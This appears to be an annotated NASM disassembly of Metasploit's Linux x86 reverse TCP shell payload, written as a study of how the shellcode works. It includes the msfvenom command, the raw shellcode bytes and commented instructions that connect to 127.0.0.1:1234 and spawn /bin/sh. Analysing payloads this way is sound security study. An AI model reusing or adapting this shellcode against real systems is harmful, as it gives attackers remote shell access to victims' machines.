; Generated from msfvenom:
; ▶  msfvenom --arch x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1234 -f sh
; No encoder specified, outputting raw payload
; Payload size: 68 bytes
; Final size of sh file: 309 bytes
; export buf=\
; $'\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd'\
; $'\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00'\
; $'\x01\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3'\
; $'\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f'\
; $'\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80'
; echo -ne $buf | ndisasm -u - > msf_reverse_tcp.nasm
;
; one-liner: \x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80

global _start

section .text

_start:
  xor ebx,ebx           ; 00000000  31DB         ; clear ebx
  mul ebx               ; 00000002  F7E3         ; clear eax and edx
  push ebx              ; 00000004  53           ; push NULL
  inc ebx               ; 00000005  43           ; ebx = 0x1
  push ebx              ; 00000006  53           ; push 0x1 ; SOCK_STREAM
  push byte +0x2        ; 00000007  6A02         ; push 0x2 ; AF_INET
  mov ecx,esp           ; 00000009  89E1         ; ecx = esp address
  mov al,0x66           ; 0000000B  B066         ; socketcall(2)
  int 0x80              ; 0000000D  CD80         ; syscall(SYS_socketcall, SYS_SOCKET = 0x1, *args(AF_INET, SOCK_STREAM)); source: /usr/include/linux/net.h

  xchg eax,ebx          ; 0000000F  93           ; ebx = sockfd, eax = 0x1
  pop ecx               ; 00000010  59           ; ecx = 0x2
  mov al,0x3f           ; 00000011  B03F         ; dup2(2)
  int 0x80              ; 00000013  CD80         ; syscall dup2(sockfd, fd)
  dec ecx               ; 00000015  49           ; decrement ecx by 1 to cover file descriptors 2, 1, and 0
  jns 0x11              ; 00000016  79F9         ; jump to al, 0x3f to start dup2 again until ecx = 0x0

  push dword 0x100007f  ; 00000018  687F000001   ; push IP_ADDR = 127.0.0.1
  push dword 0xd2040002 ; 0000001D  68020004D2   ; push PORT = 1234(0xd204) and AF_INET = 0x0002
  mov ecx,esp           ; 00000022  89E1         ; ecx = esp_address(sockaddr {AF_INET; PORT; IP_ADDR})
  mov al,0x66           ; 00000024  B066         ; socketcall(2)
  push eax              ; 00000026  50           ; push 0x66
  push ecx              ; 00000027  51           ; push esp_address(sockaddr {AF_INET; PORT; IP_ADDR})
  push ebx              ; 00000028  53           ; push sockfd
  mov bl,0x3            ; 00000029  B303         ; ebx = 0x3
  mov ecx,esp           ; 0000002B  89E1         ; ecx = esp_address(sockfd, sockaddr, 0x66)
  int 0x80              ; 0000002D  CD80         ; syscall(SYS_socketcall, SYS_CONNECT = 0x3, *args(esp_address))

  push edx              ; 0000002F  52           ; push NULL
  push dword 0x68732f6e ; 00000030  686E2F7368   ; push "n/sh"
  push dword 0x69622f2f ; 00000035  682F2F6269   ; push "//bi"
  mov ebx,esp           ; 0000003A  89E3         ; ebx = esp_address("//bin/sh")
  push edx              ; 0000003C  52           ; push NULL
  push ebx              ; 0000003D  53           ; push esp_address
  mov ecx,esp           ; 0000003E  89E1         ; ecx = esp_address(esp_address("//bin/sh"), NULL)
  mov al,0xb            ; 00000040  B00B         ; execve(2)
  int 0x80              ; 00000042  CD80         ; syscall execve(first_binsh_addr, second_binsh_addr, NULL)
